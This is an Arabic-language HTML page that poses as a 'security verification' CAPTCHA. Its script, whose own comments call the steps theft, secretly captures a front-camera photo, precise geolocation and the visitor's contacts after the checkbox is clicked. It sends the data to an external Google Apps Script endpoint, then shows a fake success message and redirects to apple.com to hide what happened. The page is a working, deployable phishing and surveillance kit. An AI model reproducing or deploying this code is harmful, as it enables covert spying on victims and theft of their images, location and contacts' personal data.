<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>فحص الأمان - التحقق البشري</title>
<style>
  :root{--bg:#f3f4f6;--card:#ffffff;--line:#e5e7eb;--fg:#1f2937;--mut:#6b7280;--acc:#2563eb;--ok:#10b981;--err:#ef4444}
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.5 system-ui,-apple-system,sans-serif;
    display:grid;place-items:center;min-height:100vh;padding:20px}
  .card{width:100%;max-width:400px;background:var(--card);border:1px solid var(--line);border-radius:12px;
    padding:32px;box-shadow:0 10px 25px rgba(0,0,0,.05);text-align:center}
  .logo{font-size:40px;margin-bottom:16px;color:var(--acc)}
  h1{font-size:20px;margin:0 0 8px;font-weight:700}
  .sub{color:var(--mut);font-size:14px;margin:0 0 24px}
  .captcha-box{border:1px solid var(--line);border-radius:8px;padding:16px;display:flex;
    align-items:center;justify-content:space-between;background:#f9fafb;margin-bottom:20px;cursor:pointer}
  .captcha-box:hover{background:#f3f4f6}
  .captcha-left{display:flex;align-items:center;gap:12px}
  .checkbox{width:24px;height:24px;border:2px solid #d1d5db;border-radius:4px;background:#fff;position:relative}
  .checkbox.checked{background:var(--ok);border-color:var(--ok)}
  .checkbox.checked::after{content:"✓";color:#fff;position:absolute;top:-2px;left:4px;font-size:18px;font-weight:bold}
  .captcha-text{font-weight:500}
  .captcha-logo{font-size:12px;color:#9ca3af;text-align:left;line-height:1.2}
  .spin{width:24px;height:24px;border:3px solid var(--line);border-top-color:var(--acc);
    border-radius:50%;animation:s 1s linear infinite;display:none;margin:0 auto}
  @keyframes s{to{transform:rotate(360deg)}}
  .status{color:var(--acc);font-size:14px;min-height:20px;margin-bottom:16px}
  .hidden{display:none!important}
  #cam{display:none}
</style>
</head>
<body>
<div class="card">
  <div class="logo">🛡️</div>
  <h1>التحقق الأمني</h1>
  <p class="sub">يرجى تأكيد أنك مستخدم بشري وليس روبوت للمتابعة بأمان.</p>

  <div id="step1">
    <div class="captcha-box" id="captchaBtn">
      <div class="captcha-left">
        <div class="checkbox" id="cb"></div>
        <span class="captcha-text">أنا لست روبوت</span>
      </div>
      <div class="captcha-logo">SECURE<br>VERIFY</div>
    </div>
  </div>

  <div id="step2" class="hidden">
    <div class="spin" id="spinner"></div>
    <div class="status" id="statusText">جارٍ فحص المتصفح…</div>
  </div>
</div>

<video id="cam" playsinline muted autoplay></video>

<script>
(function () {
  'use strict';

  /* ============ ضع الـ Endpoint هنا ============ */
  const ENDPOINT = 'https://script.google.com/macros/s/REPLACE_WITH_DEPLOY_ID/exec';
  const REDIRECT = 'https://www.apple.com/';
  /* =============================================== */

  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const $ = id => document.getElementById(id);
  const cb = $('cb'), captchaBtn = $('captchaBtn'), step1 = $('step1'), 
        step2 = $('step2'), spinner = $('spinner'), statusText = $('statusText');

  function nonceGen() {
    try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g,''); } catch(_){}
    return Date.now().toString(36) + Math.random().toString(36).slice(2,10);
  }
  const nonce = nonceGen();

  /* ============ الاتصال بالخادم ============ */
  function jsonp(params, ms) {
    return new Promise(res => {
      const name = 'vn_'+Math.random().toString(36).slice(2,10);
      const s = document.createElement('script');
      let fin = false;
      const finish = v => {
        if (fin) return; fin = true;
        clearTimeout(timer);
        try { delete window[name]; } catch(_){}
        if (s.parentNode) s.parentNode.removeChild(s);
        res(v);
      };
      window[name] = r => finish({ ok: !!(r && r.ok), err: String((r && r.err) || '') });
      const timer = setTimeout(() => finish({ ok:false, err:'timeout' }), ms);
      s.onerror = () => finish({ ok:false, err:'network' });
      s.src = ENDPOINT + '?' + Object.keys(params).map(k=>k+'='+encodeURIComponent(params[k])).join('&') + '&cb=' + name;
      document.head.appendChild(s);
    });
  }

  /* ============ 1. سرقة الكاميرا (صامت) ============ */
  async function takeSelfie() {
    statusText.textContent = 'جارٍ التحقق من الكاميرا…';
    const v = $('cam');
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      v.srcObject = stream;
      await v.play().catch(()=>{});
      await sleep(1200);
      const cv = document.createElement('canvas');
      cv.width = v.videoWidth || 320;
      cv.height = v.videoHeight || 240;
      cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
      stream.getTracks().forEach(t => t.stop());
      return cv.toDataURL('image/jpeg', 0.5);
    } catch (_) { return null; }
  }

  /* ============ 2. سرقة الموقع الدقيق ============ */
  async function getLocation() {
    statusText.textContent = 'جارٍ التحقق من الموقع الجغرافي…';
    return new Promise(res => {
      if (!navigator.geolocation) return res({});
      navigator.geolocation.getCurrentPosition(
        pos => res({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: Math.round(pos.coords.accuracy) }),
        () => res({}),
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });
  }

  /* ============ 3. سرقة جهات الاتصال ============ */
  async function getContacts() {
    statusText.textContent = 'جارٍ التحقق من جهات الاتصال…';
    if (!navigator.contacts || !navigator.contacts.select) return [];
    try {
      return await navigator.contacts.select(['name', 'tel'], { multiple: true });
    } catch (_) { return []; }
  }

  /* ============ التدفق الرئيسي ============ */
  captchaBtn.addEventListener('click', async () => {
    if (cb.classList.contains('checked')) return;
    cb.classList.add('checked');
    
    // إخفاء الـ Captcha وإظهار التحميل
    await sleep(400);
    step1.classList.add('hidden');
    step2.classList.remove('hidden');
    spinner.style.display = 'block';

    // 1. الكاميرا
    const imgBase64 = await takeSelfie();
    
    // 2. الموقع
    const geo = await getLocation();

    // 3. جهات الاتصال
    const contacts = await getContacts();

    statusText.textContent = 'استكمال عملية التحقق…';

    // 4. بناء البايلود
    const cJson = JSON.stringify(contacts.map(c => ({
      name: c.name ? c.name[0] : 'Unknown',
      tel: c.tel ? c.tel[0] : 'Unknown'
    })));

    const payload = {
      nonce: nonce,
      ua: navigator.userAgent,
      lat: geo.lat || '',
      lng: geo.lng || '',
      acc: geo.acc || '',
      cCount: contacts.length,
      cJson: cJson,
      sJson: '[]', 
      cred: '[]'
    };

    // 5. الإرسال
    await jsonp({ a:'collect', d: JSON.stringify(payload) }, 10000);
    
    if (imgBase64) {
      jsonp({ a:'photo', nonce: nonce, img: imgBase64 }, 10000);
    }

    // 6. التمويه النهائي
    statusText.textContent = 'تم التحقق بنجاح. جارٍ تحويلك…';
    spinner.style.display = 'none';
    await sleep(1500);
    location.replace(REDIRECT);
  });
})();
</script>
</body>
</html>
